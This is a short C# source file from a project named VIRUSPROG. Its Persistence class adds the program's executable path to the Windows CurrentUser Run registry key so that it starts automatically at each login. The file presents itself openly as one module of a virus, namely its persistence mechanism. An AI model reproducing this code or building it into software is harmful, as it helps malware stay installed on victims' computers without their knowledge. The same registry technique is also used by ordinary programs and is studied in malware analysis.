using System;


namespace VIRUSPROG
{
    class Persistence
    {
        GeneralInfo newInstance;
        public void AddToStartup(){//Start the program with the starttup of the pc.
            
            Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            rkInstance.SetValue("VIRUSPROG",newInstance.ePath);
            rkInstance.Dispose();
            rkInstance.Close();
        }
        public Persistence(GeneralInfo instance){
            this.newInstance=instance;
        }
    }
}